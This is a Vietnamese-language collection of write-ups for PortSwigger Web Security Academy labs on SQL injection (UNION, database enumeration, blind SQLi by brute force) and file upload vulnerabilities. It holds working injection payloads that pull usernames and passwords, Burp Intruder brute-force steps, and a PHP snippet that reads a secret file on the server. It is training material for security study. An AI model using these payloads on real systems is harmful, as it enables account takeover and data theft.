<h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column"><a class="header" href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">Lab: SQL injection UNION attack, retrieving multiple values in a single column</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/union-attacks/lab-retrieve-multiple-values-in-single-column">PortSwigger Lab</a></p>
<h2 id="mô-tả-5"><a class="header" href="#mô-tả-5">Mô tả</a></h2>
<p>Website chứa một table với tên là “users”. Việc của mình là tìm account của admin và login.</p>
<h2 id="phân-tích-2"><a class="header" href="#phân-tích-2">Phân tích</a></h2>
<p>Đầu tiên, mình đã biết trước là trong bảng users đã có 2 cột là username và password. Nhưng khi mình query thông thường thì bị lỗi server. Do vậy mình cần phải tìm cách khác.</p>
<p><img src="sql-injection/union-attacks/sqli-union-attack/multi-value-test1.jpg" alt="Payload dò cột lần 1"></p>
<p>Mình thử với <code>Payload: "Gifts' UNION SELECT NULL,username FROM users--"</code>, thì được:</p>
<p><img src="sql-injection/union-attacks/sqli-union-attack/multi-value-test2.jpg" alt="Payload dò cột lần 2"></p>
<p>Như vậy, có thể sử dụng cách này cùng với cách nối username và password lại để tìm username và password của database.</p>
<h2 id="khai-thác-5"><a class="header" href="#khai-thác-5">Khai thác</a></h2>
<p><img src="sql-injection/union-attacks/sqli-union-attack/exploit-multi-value.jpg" alt="Exploit thành công"></p>
<p>Mình thử với <code>Payload: "Gifts' UNION SELECT NULL,username ||'-'|| password FROM users--</code></p>
<h2 id="kết-quả-4"><a class="header" href="#kết-quả-4">Kết quả</a></h2>
<p><img src="sql-injection/union-attacks/sqli-union-attack/solved-union-attack-multi-value-in-column.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="sql-injection---examining-database"><a class="header" href="#sql-injection---examining-database">SQL Injection - Examining Database</a></h1>
<p>Khi tấn công SQLi, chúng ta cần phải biết những thông tin cơ bản về website, database để có được những chiến lược cụ thể như cách tiếp cận, syntax,…. Những bài lab dưới đây sẽ minh họa điều này.</p>
<h2 id="labs-2"><a class="header" href="#labs-2">Labs</a></h2>
<ul>
<li><a href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">Lab: SQL injection attack, querying the database type and version on Oracle</a></li>
<li><a href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</a></li>
<li><a href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">Lab: SQL injection attack, listing the database contents on non-Oracle databases</a></li>
<li><a href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">Lab: SQL injection attack, listing the database contents on Oracle</a></li>
</ul>
<h2 id="tổng-quan-2"><a class="header" href="#tổng-quan-2">Tổng quan</a></h2>
<p>Examining database giúp attacker:</p>
<ul>
<li>Xác định loại và version của database</li>
<li>Liệt kê các bảng trong database</li>
<li>Xem cấu trúc của các bảng</li>
<li>Trích xuất dữ liệu quan trọng</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle"><a class="header" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">Lab: SQL injection attack, querying the database type and version on Oracle</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/examining-the-database/lab-querying-database-version-oracle">PortSwigger Lab</a></p>
<h2 id="mô-tả-6"><a class="header" href="#mô-tả-6">Mô tả</a></h2>
<p>Lab này yêu cầu ta bắt database nói ra loại database và version của nó.</p>
<p>Database của lab này chính là Oracle và việc của ta là làm sao để server trả về theo yêu cầu.</p>
<h2 id="phân-tích-3"><a class="header" href="#phân-tích-3">Phân tích</a></h2>
<p>Trong Oracle, built-in table có tên là dual, do vậy, ta có thể dò cột bằng cách gọi FROM đến bảng dual.</p>
<p><img src="sql-injection/examining-database/sqli-examining-database/call-dual-table.jpg" alt="Dò cột bảng dual"></p>
<p>Đến đây, với <a href="https://portswigger.net/web-security/cheat-sheet">cheat sheet</a>, ta có thể biết được các câu query mẫu để lấy thông tin database. Từ đó, dễ dàng SQLi ở challenge này.</p>
<h2 id="khai-thác-6"><a class="header" href="#khai-thác-6">Khai thác</a></h2>
<p><code>Payload: "Gifts' UNION SELECT NULL,banner FROM v$version--"</code></p>
<h2 id="kết-quả-5"><a class="header" href="#kết-quả-5">Kết quả</a></h2>
<p><img src="sql-injection/examining-database/sqli-examining-database/solved-oracle-version.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft"><a class="header" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/examining-the-database/lab-querying-database-version-mysql-microsoft">PortSwigger Lab</a></p>
<h2 id="mô-tả-7"><a class="header" href="#mô-tả-7">Mô tả</a></h2>
<p>Lab này tương tự Lab về Oracle database ở trên nhưng lần này là với Microsoft và MySQL database.</p>
<h2 id="phân-tích-4"><a class="header" href="#phân-tích-4">Phân tích</a></h2>
<p>Database lần này cũng gồm 2 cột sau khi thử:</p>
<p><code>Payload: "Gifts' UNION SELECT NULL,NULL#"</code></p>
<p>Tuy vậy, lúc đầu mình thử ký tự “#” thì server báo lỗi. Hên sao mình nhớ đến HTML Encoding và chuyển nó thành “%23” thì oke.</p>
<h2 id="khai-thác-7"><a class="header" href="#khai-thác-7">Khai thác</a></h2>
<p><code>Payload: "Gifts' UNION SELECT NULL,@@version#"</code></p>
<h2 id="kết-quả-6"><a class="header" href="#kết-quả-6">Kết quả</a></h2>
<p><img src="sql-injection/examining-database/sqli-examining-database/solved-mysql-version.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases"><a class="header" href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">Lab: SQL injection attack, listing the database contents on non-Oracle databases</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/examining-the-database/lab-listing-database-contents-non-oracle">PortSwigger Lab</a></p>
<h2 id="mô-tả-8"><a class="header" href="#mô-tả-8">Mô tả</a></h2>
<p>Lab này yêu cầu ta tìm kiếm account của admin để login. Tuy vậy, ta chưa biết database loại nào mà chỉ biết nó không phải là Oracle mà thôi.</p>
<h2 id="phân-tích-5"><a class="header" href="#phân-tích-5">Phân tích</a></h2>
<p>Đầu tiên, mình sẽ dò số cột trong database:</p>
<p><img src="sql-injection/examining-database/sqli-examining-database/probe-database.jpg" alt="Dò số cột của database"></p>
<p>Ta thấy, có 2 cột trong database này. Tiếp tục, mình sẽ dò version của database này:</p>
<p><code>Payload: "Pets' UNION SELECT NULL,version()--"</code></p>
<p><img src="sql-injection/examining-database/sqli-examining-database/probe-version-database.jpg" alt="Dò version của database"></p>
<p>Đến đây, ta đã biết nó là PostgreSQL 11.14. Ta sẽ sử dụng query <code>SELECT null,table_name FROM information_schema.tables</code> để show các bảng trong database này.</p>
<p><img src="sql-injection/examining-database/sqli-examining-database/show-tables.jpg" alt="Show các bảng trong database"></p>
<p>Trong các bảng, có 2 bảng có thể chứa thông tin tài khoản của các user đó chính là <em>users_atqsuh</em> và <em>pg_user</em>. Mình sẽ chọn cái đầu tiên để đi sâu xem có gì trong đó, nếu không có thì quay lại thoiii :v. Trước tiên, mình sẽ cần show các cột trong bảng <em>users_atqsuh</em>:</p>
<p><code>Payload: "Pets' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_atqsuh'--"</code></p>
<p><img src="sql-injection/examining-database/sqli-examining-database/show-detail-column.jpg" alt="Show chi tiết cột"></p>
<p>Đến đây, mình đã biết được rằng thông tin tài khoản và mật khẩu sẽ được lưu vào 2 cột đó chính là <em>username_cipszl</em> và <em>password_mhklnf</em>.</p>
<h2 id="khai-thác-8"><a class="header" href="#khai-thác-8">Khai thác</a></h2>
<p>Giờ thì query nó ra thôi:</p>
<p><img src="sql-injection/examining-database/sqli-examining-database/query-account.jpg" alt="Query account"></p>
<h2 id="kết-quả-7"><a class="header" href="#kết-quả-7">Kết quả</a></h2>
<p>Có tài khoản xong thì login và solved:</p>
<p><img src="sql-injection/examining-database/sqli-examining-database/solved-listing-database.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle"><a class="header" href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">Lab: SQL injection attack, listing the database contents on Oracle</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/examining-the-database/lab-listing-database-contents-oracle">PortSwigger Lab</a></p>
<h2 id="mô-tả-9"><a class="header" href="#mô-tả-9">Mô tả</a></h2>
<p>Bài này thì tương tự bài non-Oracle ở trên. Do đó, mình sẽ làm tương tự.</p>
<h2 id="khai-thác-9"><a class="header" href="#khai-thác-9">Khai thác</a></h2>
<p><code>Payload: "Gifts' UNION SELECT null,table_name FROM all_tables--"</code></p>
<p><img src="sql-injection/examining-database/sqli-examining-database/users-table-oracle.jpg" alt="Show all table"></p>
<p><code>Payload: "Gifts' UNION SELECT null,column_name FROM all_tab_columns WHERE table_name='USERS_TXZJUA'--"</code></p>
<p><img src="sql-injection/examining-database/sqli-examining-database/show-detail-table-oracle.jpg" alt="show-detail-table-oracle"></p>
<p><code>Payload: "Gifts' UNION SELECT USERNAME_TPLFRU,PASSWORD_DHDRXQ FROM USERS_TXZJUA--"</code></p>
<p><img src="sql-injection/examining-database/sqli-examining-database/show-account-oracle.jpg" alt="show account"></p>
<h2 id="kết-quả-8"><a class="header" href="#kết-quả-8">Kết quả</a></h2>
<p>Và solve rồi nè:</p>
<p><img src="sql-injection/examining-database/sqli-examining-database/solved-listing-oracle-database.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="sql-injection---blind-sqli"><a class="header" href="#sql-injection---blind-sqli">SQL Injection - Blind SQLi</a></h1>
<p>Blind SQL Injection cho phép attack có thể sử dụng những chức năng khác của SQL để trigger, tìm kiếm và suy luận từ những response từ server mà không cần dựa vào bất kỳ lỗ hổng nào khác. Do vậy, nó được gọi là Blind - “mù”.</p>
<h2 id="labs-3"><a class="header" href="#labs-3">Labs</a></h2>
<ul>
<li><a href="#lab-blind-sql-injection-with-conditional-responses">Lab: Blind SQL injection with conditional responses</a></li>
<li><a href="#lab-blind-sql-injection-with-conditional-errors">Lab: Blind SQL injection with conditional errors</a></li>
<li><a href="#lab-blind-sql-injection-with-time-delays">Lab: Blind SQL injection with time delays</a></li>
<li><a href="#lab-blind-sql-injection-with-time-delays-and-information-retrieval">Lab: Blind SQL injection with time delays and information retrieval</a></li>
</ul>
<h2 id="tổng-quan-3"><a class="header" href="#tổng-quan-3">Tổng quan</a></h2>
<p>Blind SQLi techniques:</p>
<ul>
<li><strong>Conditional Responses</strong>: Dựa vào sự khác biệt trong response để suy luận</li>
<li><strong>Conditional Errors</strong>: Trigger lỗi có điều kiện để xác định thông tin</li>
<li><strong>Time Delays</strong>: Sử dụng time delay để xác nhận query</li>
<li><strong>Time Delays + Info Retrieval</strong>: Kết hợp time delay với brute force để trích xuất dữ liệu</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-blind-sql-injection-with-conditional-responses"><a class="header" href="#lab-blind-sql-injection-with-conditional-responses">Lab: Blind SQL injection with conditional responses</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/blind/lab-conditional-responses">PortSwigger Lab</a></p>
<h2 id="mô-tả-10"><a class="header" href="#mô-tả-10">Mô tả</a></h2>
<p>Bài lab này được thiết kế để ta attack bằng phương pháp Blind SQLi. Nó chứa một cái gọi là tracking cookie để phân tích và kiểm soát cookie người dùng. <em>Bên cạnh đó, khi query thì không gì được trả về nếu điều kiện sai hoặc lỗi ngoại trừ khi mình query đúng thì nó sẽ trả về chuỗi “Welcome back”</em>. Bên cạnh đó, nó chứa một bảng users với 2 cột là username và password. Lab yêu cầu ta chiếm quyền kiểm soát administrator.</p>
<h2 id="phân-tích-6"><a class="header" href="#phân-tích-6">Phân tích</a></h2>
<p>Mở Burp lên và kiểm tra request khi filter category thì mình sẽ thấy một tham số là TrackingId.</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/tracking-id.jpg" alt="TrackingId trong request"></p>
<p>Bây giờ, mình sẽ thử test điều kiền khi lồng toán tử vào chỗ này:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/test-condition-res.jpg" alt="Test condition"></p>
<p>Như vậy, có thể thấy, mình sẽ có thể Blind SQLi ở đây để dò ra thông tin cần tìm (password). Giờ thì mình sẽ thử dò thử xem có account với username là “administrator” hay không:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/probe-table-and-admin-user.jpg" alt="Dò account admin"></p>
<p>Tada, website chứa account admin đó rồi (cái này lab cũng có đề cập nhưng mà mình kiếm thử). Giờ thì đến công đoạn tìm password. Trước tiên, mình sẽ dùng <strong>LENGTH()</strong> để kiểm tra xem password có độ dài bao nhiêu. Sau khi dò với operator <strong>&gt;</strong> và <strong>&lt;</strong> một lúc thì mình đã xác định được <code>LENGTH(password)=20</code>:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/find-length-password.jpg" alt="Dò account admin"></p>
<h2 id="khai-thác-10"><a class="header" href="#khai-thác-10">Khai thác</a></h2>
<p>Đến đây, mình sẽ phải dò từng ký tự trong password (20 lần) để có thể ghép lại thành password cần tìm với payload:</p>
<p><code>Payload: "TrackingId=G4M7YunBTBgfypfH' AND (SELECT SUBSTRING(password,{vi-tri-do},1) FROM users WHERE username='administrator' AND LENGTH(password)=20)='{ky-tu-can-do}"</code></p>
<p>Mình đã biết rằng, khi điều kiện SQL đúng thì website sẽ trả về string “Welcome back!”, do vậy, mình sẽ brute-force nó bằng Burp Intruder. Sau đây là một vài setting trước khi brute-force:</p>
<ul>
<li>Chỉnh chế độ về Cluster-bomb để có thể tùy chỉnh vị trí payload brute-force</li>
<li>Thêm khóa vào vị trí cần brute-force với nút “Add $”. Khóa đầu tiên mình để là vị trí trong password (1-20) và khóa thứ hai là ký tự trong password.</li>
</ul>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/bruteforce.jpg" alt="Setting cluster-bomb mode"></p>
<ul>
<li>Tạo danh sách các ký tự có thể có trong password (a-Z, 0-9) cho lần lượt 2 khóa như ảnh trên.</li>
</ul>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/intruder-payload-options.jpg" alt="Payload list trước khi brute-force"></p>
<ul>
<li>Tạo điều kiện trả về khi tìm đúng ký tự với điều kiện là “Welcome back!”</li>
</ul>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/intruder-grep.jpg" alt="Tạo điều kiện trả về"></p>
<ul>
<li>Click “Start attack” và chờ thôi</li>
</ul>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/while-bruteforce.jpg" alt="Trong khi bruteforce"></p>
<p>Sau 2 - 3 tiếng bruteforce, mình đã có được những kết quả trả về match với “Welcome back!”. Công việc giờ là sắp xếp lại thành một chuỗi theo thứ tự thôi:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/finish-bruteforce.jpg" alt="Kết quả bruteforce"></p>
<p>Chuỗi password mà mình đã sắp xếp: <code>Password: 3n2xxm4cprzjuiim5hpi</code></p>
<h2 id="kết-quả-9"><a class="header" href="#kết-quả-9">Kết quả</a></h2>
<p>Submit và solved challenge rồi nè:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-res/solved.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-blind-sql-injection-with-conditional-errors"><a class="header" href="#lab-blind-sql-injection-with-conditional-errors">Lab: Blind SQL injection with conditional errors</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/blind/lab-conditional-errors">PortSwigger Lab</a></p>
<h2 id="mô-tả-11"><a class="header" href="#mô-tả-11">Mô tả</a></h2>
<p>Lab này cũng khá giống với bài conditonal response. Đại khái, nếu bài lab trước ta có thể dựa vào phản hồi “Welcome back!” để suy luận ra đúng ký tự password thì ở lab này, ta sẽ phải dựa vào lỗi phản hồi để có thể suy luận. Vì vậy, mình sẽ làm nhanh hehe:</p>
<h2 id="khai-thác-11"><a class="header" href="#khai-thác-11">Khai thác</a></h2>
<p>Xác định database:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-error/define-database.jpg" alt="Xác định database"></p>
<p>Xác định độ dài password (length=20):</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-error/length-password.jpg" alt="Xác định độ dài password"></p>
<p>Kết quả bruteforce:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-error/finish-bruteforce.jpg" alt="Kết quả bruteforce"></p>
<p>Password sau khi ghép lại: <code>i1xcr4zruhfc78onms06</code>.</p>
<h2 id="kết-quả-10"><a class="header" href="#kết-quả-10">Kết quả</a></h2>
<p>Và solved challenge:</p>
<p><img src="sql-injection/blind-sqli/blind-conditional-error/solved.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-blind-sql-injection-with-time-delays"><a class="header" href="#lab-blind-sql-injection-with-time-delays">Lab: Blind SQL injection with time delays</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/blind/lab-time-delays">PortSwigger Lab</a></p>
<h2 id="mô-tả-12"><a class="header" href="#mô-tả-12">Mô tả</a></h2>
<p>Trong lab này, chúng ta cần khiến cho server bị delay 10 giây. Với blind SQLi, ta có thể sử dụng <strong>time delays</strong> trong các câu query.</p>
<h2 id="phân-tích-7"><a class="header" href="#phân-tích-7">Phân tích</a></h2>
<p><img src="sql-injection/blind-sqli/blind-time-delays/time-delays-table.jpg" alt="SQLi time delay cheat-sheet"></p>
<p>Bằng bảng cheat-sheet trên, mình đã biết thử và thấy được database này là PostgreSQL. Do vậy, lab khá nhanh khi mình chỉ cần concat TrackingId với câu truy vấn bằng payload sau đây:</p>
<h2 id="khai-thác-12"><a class="header" href="#khai-thác-12">Khai thác</a></h2>
<p><img src="sql-injection/blind-sqli/blind-time-delays/payload.jpg" alt="SQLi time delay cheat-sheet"></p>
<h2 id="kết-quả-11"><a class="header" href="#kết-quả-11">Kết quả</a></h2>
<p>Sau đó, kiểm tra browser và solved lab thooiiiii:</p>
<p><img src="sql-injection/blind-sqli/blind-time-delays/solved.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-blind-sql-injection-with-time-delays-and-information-retrieval"><a class="header" href="#lab-blind-sql-injection-with-time-delays-and-information-retrieval">Lab: Blind SQL injection with time delays and information retrieval</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/blind/lab-time-delays-info-retrieval">PortSwigger Lab</a></p>
<h2 id="mô-tả-13"><a class="header" href="#mô-tả-13">Mô tả</a></h2>
<p>Như tên của nó, bài lab này yêu cầu ta thực hiện blind SQLi cùng với time delays để leak tài khoản administrator từ database. Lab này đại khái là sự kết hợp của Blind SQLi conditional responses và Blind SQLi time delays. Do vậy, theo hướng đó thì làm khá nhanh khi mình chỉ cần thay đổi cách bruteforce.</p>
<h2 id="phân-tích-8"><a class="header" href="#phân-tích-8">Phân tích</a></h2>
<p>Đầu tiên, xác định database để lựa syntax đúng:</p>
<p><img src="sql-injection/blind-sqli/blind-time-delays-info-retrieval/define-database.jpg" alt="Xác định database"></p>
<p>Bằng cách đó, mình biết rằng database lần này là PortgreSQL.</p>
<h2 id="khai-thác-13"><a class="header" href="#khai-thác-13">Khai thác</a></h2>
<p>Sau đó, tới công đoạn setup bruteforce. Lần này, mình không thể dùng “grep match” của Intruder vì phản hồi trả về là không có gì cả. Do vậy, mình sẽ sử dụng Resource Pool để setup thời gian timeout cho mỗi request:</p>
<p><img src="sql-injection/blind-sqli/blind-time-delays-info-retrieval/resource-pool.jpg" alt="Tạo resource pool"></p>
<p>Và bắt đầu bruteforce thôi. Sau một khoản thời gian không ngắn, mình đã tìm được password: <code>6lunhbudoihu7km8zku1</code>.</p>
<h2 id="kết-quả-12"><a class="header" href="#kết-quả-12">Kết quả</a></h2>
<p>Submit và solved lab hehe:</p>
<p><img src="sql-injection/blind-sqli/blind-time-delays-info-retrieval/solved.jpg" alt="Solved"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="file-upload-vulnerabilities"><a class="header" href="#file-upload-vulnerabilities">File Upload Vulnerabilities</a></h1>
<h2 id="lỗ-hổng-file-upload"><a class="header" href="#lỗ-hổng-file-upload">Lỗ hổng file upload</a></h2>
<p>Lỗ hổng file upload là một loại lỗ hổng có mức độ nghiêm trọng cao. Nó xảy ra khi một web server cho phép người dùng đăng tải một tệp lên filesystem mà không qua những bước xác thực (tên, loại tệp, nội dung, kích thước,…) hoặc hệ thống bị lỗi khi xác thực.</p>
<p>Khi đó, attacker có thể lợi dụng lỗ hổng này để tấn công hệ thống bằng các phương pháp khác nhau, đặc biệt là RCE (Remote Code Execution), khiến hệ thống của bạn vào trạng thái nguy hiểm.</p>
<h2 id="tác-động-của-lỗ-hổng"><a class="header" href="#tác-động-của-lỗ-hổng">Tác động của lỗ hổng</a></h2>
<p>Hai tác động chính của lỗ hổng này:</p>
<ul>
<li>Hệ thống xác thực sai cách và bỏ qua những xác thực quan trọng</li>
<li>Những ràng buộc được thiết lập thực thi không đúng khi tệp đã tải lên hệ thống</li>
</ul>
<p>Trường hợp xấu nhất là hệ thống cho phép thực thi các tệp nguy hiểm (như .php, .jsp, .aspx). Điều này cho phép attacker tải lên webshell và kiểm soát hoàn toàn server.</p>
<h2 id="các-trường-hợp-có-thể-xảy-ra"><a class="header" href="#các-trường-hợp-có-thể-xảy-ra">Các trường hợp có thể xảy ra</a></h2>
<p>Trong thực tế, các công ty, tổ chức thường kiểm soát lỗ hổng này. Tuy nhiên, vẫn có thể tồn tại các trường hợp:</p>
<ul>
<li>Quên xác thực các loại tệp, nội dung, kích thước</li>
<li>Tạo blacklist nhưng không xác thực <strong>extensions lạ</strong> (ví dụ: .phtml, .php5)</li>
<li>Web server <strong>không nhất quán</strong> khiến attacker có thể <strong>path traversal</strong></li>
<li>Hệ thống bị bypass dễ dàng bằng các thủ thuật của attacker (null byte, double extension, polyglot files)</li>
</ul>
<h2 id="labs---danh-sách-các-bài-thực-hành-1"><a class="header" href="#labs---danh-sách-các-bài-thực-hành-1">Labs - Danh sách các bài thực hành</a></h2>
<h3 id="1-basic-rce-labs"><a class="header" href="#1-basic-rce-labs">1. Basic RCE Labs</a></h3>
<p><a href="file-upload/basic-rce/README.html">Các lab về RCE cơ bản</a></p>
<ul>
<li><a href="#lab-remote-code-execution-via-web-shell-upload">Lab: Remote code execution via web shell upload</a></li>
<li><a href="#lab-web-shell-upload-via-content-type-restriction-bypass">Lab: Web shell upload via Content-Type restriction bypass</a></li>
<li><a href="#lab-web-shell-upload-via-path-traversal">Lab: Web shell upload via path traversal</a></li>
</ul>
<h3 id="2-bypass-techniques"><a class="header" href="#2-bypass-techniques">2. Bypass Techniques</a></h3>
<p><a href="file-upload/bypass-techniques/README.html">Các kỹ thuật bypass validation</a></p>
<ul>
<li><a href="#lab-web-shell-upload-via-extension-blacklist-bypass">Lab: Web shell upload via extension blacklist bypass</a></li>
<li><a href="#lab-web-shell-upload-via-obfuscated-file-extension">Lab: Web shell upload via obfuscated file extension</a></li>
<li><a href="#lab-remote-code-execution-via-polyglot-web-shell-upload">Lab: Remote code execution via polyglot web shell upload</a></li>
</ul>
<h3 id="3-advanced-techniques"><a class="header" href="#3-advanced-techniques">3. Advanced Techniques</a></h3>
<p><a href="file-upload/advanced-techniques/README.html">Kỹ thuật nâng cao - Race Condition</a></p>
<ul>
<li><a href="#lab-web-shell-upload-via-race-condition">Lab: Web shell upload via race condition</a></li>
</ul>
<h2 id="cách-phòng-chống"><a class="header" href="#cách-phòng-chống">Cách phòng chống</a></h2>
<h3 id="các-best-practices"><a class="header" href="#các-best-practices">Các best practices</a></h3>
<ul>
<li>Sử dụng <strong>whitelist</strong> thay vì blacklist cho phép extensions</li>
<li>Đảm bảo filename không chứa ký tự đặc biệt (tránh path traversal)</li>
<li>Đổi tên tệp đã tải lên để tránh conflict và bypass</li>
<li>Không cho phép tệp được thực thi trực tiếp từ upload directory</li>
<li>Validate file content, không chỉ dựa vào extension</li>
<li>Lưu trữ uploaded files ngoài webroot nếu có thể</li>
<li>Sử dụng separate domain cho user-uploaded content</li>
</ul>
<h3 id="các-cách-tấn-công-khác"><a class="header" href="#các-cách-tấn-công-khác">Các cách tấn công khác</a></h3>
<p>Ngoài RCE, file upload còn có thể bị khai thác để:</p>
<ul>
<li>Stored XSS: Upload file HTML/SVG chứa JavaScript</li>
<li>XXE Injection: Upload file XML chứa external entity</li>
<li>DoS: Upload file quá lớn</li>
<li>Path Traversal: Overwrite file hệ thống</li>
</ul>
<h2 id="tài-nguyên-tham-khảo-1"><a class="header" href="#tài-nguyên-tham-khảo-1">Tài nguyên tham khảo</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/file-upload">PortSwigger File Upload Vulnerabilities</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">OWASP File Upload Cheat Sheet</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="file-upload---basic-rce-techniques"><a class="header" href="#file-upload---basic-rce-techniques">File Upload - Basic RCE Techniques</a></h1>
<blockquote>
<p><strong>Remote Code Execution (RCE) qua File Upload</strong></p>
<p>Các labs trong phần này tập trung vào các kỹ thuật cơ bản để khai thác RCE thông qua lỗ hổng file upload.</p>
</blockquote>
<h2 id="giới-thiệu"><a class="header" href="#giới-thiệu">Giới thiệu</a></h2>
<p>RCE (Remote Code Execution) là một trong những lỗ hổng nguy hiểm nhất trong bảo mật web. Khi kết hợp với file upload vulnerabilities, attacker có thể:</p>
<ul>
<li>Upload web shell lên server</li>
<li>Thực thi code tùy ý</li>
<li>Đọc file nhạy cảm</li>
<li>Chiếm quyền kiểm soát server</li>
</ul>
<h2 id="labs-4"><a class="header" href="#labs-4">Labs</a></h2>
<h3 id="remote-code-execution-via-web-shell-upload"><a class="header" href="#remote-code-execution-via-web-shell-upload"><a href="#lab-remote-code-execution-via-web-shell-upload">Remote code execution via web shell upload</a></a></h3>
<p>Lab cơ bản nhất về file upload RCE - server không có bất kỳ validation nào.</p>
<h3 id="web-shell-upload-via-content-type-restriction-bypass"><a class="header" href="#web-shell-upload-via-content-type-restriction-bypass"><a href="#lab-web-shell-upload-via-content-type-restriction-bypass">Web shell upload via Content-Type restriction bypass</a></a></h3>
<p>Bypass validation Content-Type để upload web shell lên server.</p>
<h3 id="web-shell-upload-via-path-traversal"><a class="header" href="#web-shell-upload-via-path-traversal"><a href="#lab-web-shell-upload-via-path-traversal">Web shell upload via path traversal</a></a></h3>
<p>Sử dụng path traversal để upload file vào thư mục có thể thực thi code.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-remote-code-execution-via-web-shell-upload"><a class="header" href="#lab-remote-code-execution-via-web-shell-upload">Lab: Remote code execution via web shell upload</a></h1>
<p><strong>Link:</strong> <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload">https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload</a></p>
<p><img src="file-upload/basic-rce/rce-webshell-upload/lab.jpg" alt="Lab RCE basic"></p>
<h2 id="mục-tiêu"><a class="header" href="#mục-tiêu">Mục tiêu</a></h2>
<p>Bài lab này yêu cầu mình tải lên một đoạn code RCE để có thể kiểm soát web server hay khai thác tải lên tệp không hạn chế để triển khai web shell</p>
<h2 id="giải-pháp"><a class="header" href="#giải-pháp">Giải pháp</a></h2>
<p>Đầu tiên, bật Burp Suite và sử dụng browser của ứng dụng để truy cập vào Lab và thực hiện login bằng tài khoản đã được cung cấp. Vì đây là bài lab liên quan đến upload file nên mình sẽ mò qua phần <em>My Account</em> để sử dụng chức năng tải Avatar lên hệ thống.</p>
<p><img src="file-upload/basic-rce/rce-webshell-upload/upload-ava.jpg" alt="Tải avatar lên hệ thống"></p>
<p>Sau khi tải thử cái ảnh xàm xí lên hệ thống thì mình nhận được cái thông báo như vầy</p>
<p><img src="file-upload/basic-rce/rce-webshell-upload/after-upload-ava.jpg" alt="Sau khi tải avatar lên hệ thống"></p>
<p>Đến đây thì chưa có bất kỳ “clue” nào để mình tiếp tục cả, mò qua HTTP History của chức năng Proxy trong Burp Suite thì ta có thể thấy được các URL mà hệ thống đã thực thi</p>
<p><img src="file-upload/basic-rce/rce-webshell-upload/http-history.jpg" alt="HTTP History"></p>
<p>Như vậy, ta có thể thấy được hệ thống cho phép ta tải lên hình ảnh. Hình ảnh này sẽ được lưu trữ tại <code>/files/avatars/{tên-tệp}</code></p>
<h2 id="khai-thác-14"><a class="header" href="#khai-thác-14">Khai thác</a></h2>
<p>Theo như đề bài, <em>secret</em> được cất giữ tại <code>/home/carlos/secret</code> và web server sử dụng ngôn ngữ PHP. Do đó, mình sẽ sử dụng một RCE payload code để có thể “reveal” bí mật của chú Carlos và lưu lại với cái tên mỹ miều là <em>1.php</em> =)))</p>
<pre><code class="language-php">&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;
</code></pre>
<p>Sau đó, ta tiến hành tải tệp này lên hệ thống:</p>
